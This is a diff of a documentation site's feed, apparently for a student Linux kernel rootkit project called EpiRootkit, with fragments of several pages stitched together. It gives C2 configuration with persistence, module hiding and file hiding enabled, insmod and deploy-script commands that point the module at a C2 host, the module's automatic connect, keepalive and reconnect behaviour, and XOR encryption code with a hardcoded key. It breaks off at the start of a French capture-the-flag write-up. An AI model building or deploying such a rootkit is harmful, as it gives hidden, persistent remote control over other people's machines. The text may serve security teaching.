+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="3d8f7f0" class="language- ">
+ &lt;code>C2 Server ←→ Network/DNS ←→ EpiRootkit ←→ Linux Kernel
+(Node.js) (TCP/UDP) (Module) (System Calls)&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h2 id="technical-stack">Technical Stack &lt;a href="#technical-stack" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
+&lt;li>&lt;strong>Target&lt;/strong>: Ubuntu 20.04 LTS, kernel 5.4.0, x86_64&lt;/li>
+&lt;li>&lt;strong>Language&lt;/strong>: C (kernel module) + Node.js (C2 server)&lt;/li>
+&lt;li>&lt;strong>APIs&lt;/strong>: ftrace, kretprobe, VFS, UDP sockets&lt;/li>
+&lt;li>&lt;strong>Network&lt;/strong>: TCP (C2) + UDP (DNS resolution)&lt;/li>
+&lt;li>&lt;strong>Encryption&lt;/strong>: XOR cipher with 32-byte hardcoded key (bulletproof reliability)&lt;/li>
+&lt;li>&lt;strong>Authentication&lt;/strong>: SHA-512 with rate limiting (5 attempts/60s)&lt;/li>
+&lt;/ul>
+&lt;h2 id="configuration">Configuration &lt;a href="#configuration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Edit &lt;code>rootkit/core/config.h&lt;/code>:&lt;/p></description></item><item><title>Build &amp; Deployment</title><link>/docs/05-epirootkit/deployment/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/05-epirootkit/deployment/</guid><description>&lt;h1 id="build--deployment">Build &amp;amp; Deployment &lt;a href="#build--deployment" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>How to build and deploy EpiRootkit on Ubuntu 20.04 with kernel 5.4.0.&lt;/p>
 &lt;h2 id="requirements">Requirements &lt;a href="#requirements" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="system">System &lt;a href="#system" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
 &lt;li>&lt;strong>OS&lt;/strong>: Ubuntu 20.04 LTS&lt;/li>
 &lt;li>&lt;strong>Kernel&lt;/strong>: 5.4.0-* (check with &lt;code>uname -r&lt;/code>)&lt;/li>
@@ -1251,7 +1319,7 @@ sudo apt install -y build-essential linux-headers-$(uname -r)&lt;/code>
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="2ae5558" class="language-c ">
+ &lt;pre id="6fe5c17" class="language-c ">
  &lt;code>// Option 1: Domain name (recommended)
 #define C2_SERVER_ADDRESS &amp;#34;jules-c2.example.com&amp;#34;
 #define C2_SERVER_PORT 4444
@@ -1261,13 +1329,13 @@ sudo apt install -y build-essential linux-headers-$(uname -r)&lt;/code>
 #define C2_SERVER_PORT 4444
 
 // Feature settings
-#define ENABLE_ENCRYPTION 0 // Encryption disabled
+#define ENABLE_ENCRYPTION 1 // XOR encryption enabled
 #define ENABLE_PERSISTENCE 1 // Auto-install persistence
 #define ENABLE_MODULE_HIDING 1 // Hide module by default
 #define ENABLE_FILE_HIDING 1 // Hide files with prefixes&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h2 id="build-process">Build Process &lt;a href="#build-process" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+&lt;h2 id="build">Build &lt;a href="#build" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 
 
  
@@ -1282,18 +1350,13 @@ sudo apt install -y build-essential linux-headers-$(uname -r)&lt;/code>
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="78aa9a7" class="language-bash ">
+ &lt;pre id="f9e9859" class="language-bash ">
  &lt;code>cd rootkit
 make clean &amp;amp;&amp;amp; make
-# ✓ Build successful: epirootkit.ko created
-
-# Verify build
-ls -la epirootkit.ko
-file epirootkit.ko
-# epirootkit.ko: ELF 64-bit LSB relocatable, x86-64&lt;/code>
+# ✓ Build successful: epirootkit.ko created&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h2 id="deployment">Deployment &lt;a href="#deployment" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="method-1-deployment-script-recommended">Method 1: Deployment Script (Recommended) &lt;a href="#method-1-deployment-script-recommended" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+&lt;h2 id="deployment">Deployment &lt;a href="#deployment" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="quick-deploy-recommended">Quick Deploy (Recommended) &lt;a href="#quick-deploy-recommended" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
 
  
@@ -1319,13 +1382,86 @@ sudo ./deploy_rootkit.sh address=192.168.1.100 port=4444
 sudo ./deploy_rootkit.sh&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;p>&lt;strong>What it does:&lt;/strong>&lt;/p></description></item><item><title>Connection &amp; Authentication</title><link>/docs/05-epirootkit/connection-authentication/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/05-epirootkit/connection-authentication/</guid><description>&lt;h1 id="connection--authentication">Connection &amp;amp; Authentication &lt;a href="#connection--authentication" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>How EpiRootkit connects to the C2 server and handles authentication with &lt;strong>domain support&lt;/strong>.&lt;/p>
-&lt;h2 id="connection-process">Connection Process &lt;a href="#connection-process" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="automatic-connection">Automatic Connection &lt;a href="#automatic-connection" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>When the rootkit loads, it automatically:&lt;/p>
+&lt;h3 id="manual-loading">Manual Loading &lt;a href="#manual-loading" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="b5259ca" class="language-bash ">
+ &lt;code># Load with domain
+sudo insmod epirootkit.ko address=jules_chef_de_majeur.epirootkit.com
+
+# Load with IP
+sudo insmod epirootkit.ko address=192.168.1.100 port=4444
+
+# Load with defaults
+sudo insmod epirootkit.ko&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h2 id="management">Management &lt;a href="#management" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="check-status">Check Status &lt;a href="#check-status" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="ab56047" class="language-bash ">
+ &lt;code>sudo ./deploy_rootkit.sh status
+# Module Status: LOADED
+# Location: /lib/modules/5.4.0-74-generic/extra/epirootkit.ko
+# Autoload: ENABLED (/etc/modules-load.d/epirootkit.conf)
+# Connection: CONNECTED (c2.example.com:443)&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h3 id="complete-removal">Complete Removal &lt;a href="#complete-removal" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="5ba7b2a" class="language-bash ">
+ &lt;code>sudo ./deploy_rootkit.sh uninstall
+# ✓ Module unloaded
+# ✓ Autoload disabled
+# ✓ Module file removed
+# ✓ Dependencies updated&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;p>&lt;strong>Domain Support&lt;/strong>: The rootkit supports both domain names and IP addresses. For DNS resolution details, see &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/05-epirootkit/features/dns-resolution/'>&lt;p>FEATURES&lt;/p></description></item><item><title>Connection &amp; Authentication</title><link>/docs/05-epirootkit/connection-authentication/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/05-epirootkit/connection-authentication/</guid><description>&lt;h1 id="connection--authentication">Connection &amp;amp; Authentication &lt;a href="#connection--authentication" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>How EpiRootkit connects to the C2 server and handles authentication with &lt;strong>domain support&lt;/strong> and &lt;strong>XOR encryption&lt;/strong>.&lt;/p>
+&lt;h2 id="connection-process">Connection Process &lt;a href="#connection-process" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>When the rootkit loads, it automatically:&lt;/p>
 &lt;ol>
 &lt;li>&lt;strong>Starts connection thread&lt;/strong> (&lt;code>epirootkit_conn&lt;/code>)&lt;/li>
 &lt;li>&lt;strong>Resolves domain&lt;/strong> (if address is domain name) - see &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/05-epirootkit/features/dns-resolution/'>&lt;p>FEATURES&lt;/p>&lt;strong>DNS Resolution&lt;/strong>&lt;br>Kernel-space domain name resolution for flexible C2 connectivity&lt;/a>" data-bs-toggle="tooltip" href="/docs/05-epirootkit/features/dns-resolution/">DNS Resolution&lt;/a>&lt;/li>
 &lt;li>&lt;strong>Attempts TCP connection&lt;/strong> to configured C2 server&lt;/li>
 &lt;li>&lt;strong>Begins keepalive system&lt;/strong> (60-second ping/pong)&lt;/li>
+&lt;li>&lt;strong>Enables XOR encryption&lt;/strong> for all C2 communication&lt;/li>
 &lt;li>&lt;strong>Handles reconnection&lt;/strong> with exponential backoff&lt;/li>
 &lt;/ol>
 &lt;h3 id="configuration-with-domain-support">Configuration with Domain Support &lt;a href="#configuration-with-domain-support" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
@@ -1546,7 +1682,88 @@ upload Client-1 ./script.sh&lt;/code>
  &lt;code>int kernel_dns_resolve(const char *hostname, u32 *ip_addr);&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;p>&lt;strong>Parameters:&lt;/strong>&lt;/p></description></item><item><title>Tux Fan Club: Chasse au Trésor Pirate</title><link>/docs/06-bonuses/wlkom-ctf/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/06-bonuses/wlkom-ctf/</guid><description>&lt;h2 id="treasure-hunt-">Treasure Hunt 🪙 &lt;a href="#treasure-hunt-" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="découverte-dun-mystérieux-fichier">Découverte d&amp;rsquo;un mystérieux fichier&amp;hellip; &lt;a href="#d%c3%a9couverte-dun-myst%c3%a9rieux-fichier" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Nous avons décidé d&amp;rsquo;accepter une &lt;em>quête secondaire&lt;/em> durant le projet &lt;code>Rootkit&lt;/code>.&lt;/p>
+&lt;p>&lt;strong>Parameters:&lt;/strong>&lt;/p></description></item><item><title>XOR Encryption</title><link>/docs/05-epirootkit/features/encryption/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/encryption/</guid><description>&lt;h1 id="xor-encryption">XOR Encryption &lt;a href="#xor-encryption" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>EpiRootkit uses XOR encryption for secure C2 communication with a bulletproof, dependency-free implementation.&lt;/p>
+&lt;h2 id="overview">Overview &lt;a href="#overview" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>The XOR encryption system provides:&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>Simple Implementation&lt;/strong>: No complex crypto API dependencies&lt;/li>
+&lt;li>&lt;strong>Bulletproof Reliability&lt;/strong>: Cannot fail due to timing or key derivation issues&lt;/li>
+&lt;li>&lt;strong>Perfect Synchronization&lt;/strong>: Server and kernel use identical keys&lt;/li>
+&lt;li>&lt;strong>High Performance&lt;/strong>: Minimal computational overhead&lt;/li>
+&lt;/ul>
+&lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="server-side-attacking_programsrcutilsencryptionjs">Server Side (&lt;code>attacking_program/src/utils/encryption.js&lt;/code>) &lt;a href="#server-side-attacking_programsrcutilsencryptionjs" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="9d4c973" class="language-javascript ">
+ &lt;code>// 32-byte hardcoded XOR key
+const XOR_KEY = Buffer.from(&amp;#39;0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef&amp;#39;, &amp;#39;hex&amp;#39;);
+
+function xorCrypt(data) {
+ const input = Buffer.isBuffer(data) ? data : Buffer.from(data, &amp;#39;utf8&amp;#39;);
+ const result = Buffer.alloc(input.length);
+ 
+ for (let i = 0; i &amp;lt; input.length; i&amp;#43;&amp;#43;) {
+ result[i] = input[i] ^ XOR_KEY[i % XOR_KEY.length];
+ }
+ 
+ return result;
+}
+
+const encryption = {
+ encrypt(text) { return xorCrypt(text); },
+ decrypt(data) { return xorCrypt(data).toString(&amp;#39;utf8&amp;#39;); }
+};&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h3 id="kernel-side-rootkitsecuritycryptoc">Kernel Side (&lt;code>rootkit/security/crypto.c&lt;/code>) &lt;a href="#kernel-side-rootkitsecuritycryptoc" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="f22c02c" class="language-c ">
+ &lt;code>// Matching XOR key (32 bytes)
+static const u8 XOR_KEY[] = {
+ 0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef,
+ 0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef,
+ 0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef,
+ 0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef
+};
+
+static void xor_crypt(const u8 *input, u8 *output, size_t length)
+{
+ size_t i;
+ 
+ for (i = 0; i &amp;lt; length; i&amp;#43;&amp;#43;) {
+ output[i] = input[i] ^ XOR_KEY[i % XOR_KEY_SIZE];
+ }
+}
+
+int encrypt_message(const char *plaintext, char **ciphertext, size_t *outlen);
+int decrypt_message(const char *ciphertext, size_t cipherlen, char **plaintext);&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h2 id="key-features">Key Features &lt;a href="#key-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="1-hardcoded-key-synchronization">1. Hardcoded Key Synchronization &lt;a href="#1-hardcoded-key-synchronization" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Both server and kernel use the &lt;strong>exact same 32-byte key&lt;/strong>:&lt;/p></description></item><item><title>Tux Fan Club: Chasse au Trésor Pirate</title><link>/docs/06-bonuses/wlkom-ctf/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/06-bonuses/wlkom-ctf/</guid><description>&lt;h2 id="treasure-hunt-">Treasure Hunt 🪙 &lt;a href="#treasure-hunt-" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="découverte-dun-mystérieux-fichier">Découverte d&amp;rsquo;un mystérieux fichier&amp;hellip; &lt;a href="#d%c3%a9couverte-dun-myst%c3%a9rieux-fichier" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Nous avons décidé d&amp;rsquo;accepter une &lt;em>quête secondaire&lt;/em> durant le projet &lt;code>Rootkit&lt;/code>.&lt;/p>
 &lt;p>En effet, comme tout bon pirate, nous avons téléchargé &lt;em>légalement&lt;/em> les fichiers fournis (&lt;code>given files&lt;/code>) et nous souhaitions les ignorer avec un fichier &lt;code>.gitignore&lt;/code>.&lt;/p>
 &lt;p>Le &lt;code>.gitignore&lt;/code> ressemblait à :&lt;/p>
 
